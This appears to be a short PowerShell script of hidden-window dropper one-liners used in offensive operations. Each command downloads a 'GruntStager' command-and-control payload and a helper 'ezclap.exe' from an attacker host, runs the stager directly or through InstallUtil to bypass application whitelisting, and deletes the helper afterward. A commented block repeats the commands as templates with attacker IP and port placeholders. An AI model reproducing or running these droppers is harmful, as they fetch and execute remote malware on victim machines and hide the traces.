
<# Using environment variables and downloading payload/ezclap to somewhere other than C:\ might be better #>


<#
	Dropper for .EXE payloads 
#>
powershell.exe -Sta -Nop -Window Hidden -c (New-Object System.Net.WebClient).DownloadFile("http://192.168.204.151:8080/GruntStager.exe", "C:\GruntStager.exe");(New-Object System.Net.WebClient).DownloadFile("http://192.168.204.151:8080/ezclap.exe", "C:\ezclap.exe");C:\ezclap.exe -t all -b C:\GruntStager.exe;Remove-Item -Path C:\ezclap.exe -Force


<#
	Dropper for .DLL payloads 
#>
powershell.exe -Sta -Nop -Window Hidden -c (New-Object System.Net.WebClient).DownloadFile("http://192.168.204.151:8080/GruntStager.dll", "C:\GruntStager.dll");(New-Object System.Net.WebClient).DownloadFile("http://192.168.204.151:8080/ezclap.exe", "C:\ezclap.exe");C:\ezclap.exe -t all -c "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U C:\GruntStager.dll";Remove-Item -Path C:\ezclap.exe -Force


<#
	===================================================================================================================================
#>
<#
powershell.exe -Sta -Nop -Window Hidden -c (New-Object System.Net.WebClient).DownloadFile("http://<attackerIP>:<PORT>/<payload.exe>", "C:\<payload.exe>");(New-Object System.Net.WebClient).DownloadFile("http://<attackerIP>:<PORT>/ezclap.exe", "C:\ezclap.exe");C:\ezclap.exe -t all -b C:\GruntStager.exe;Remove-Item -Path C:\ezclap.exe -Force

powershell.exe -Sta -Nop -Window Hidden -c (New-Object System.Net.WebClient).DownloadFile(""http://<attackerIP>:<PORT>/GruntStager.dll", "C:\GruntStager.dll");(New-Object System.Net.WebClient).DownloadFile("http://<attackerIP>:<PORT>/ezclap.exe", "C:\ezclap.exe");C:\ezclap.exe -t all -c "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U C:\GruntStager.dll";Remove-Item -Path C:\ezclap.exe -Force
#>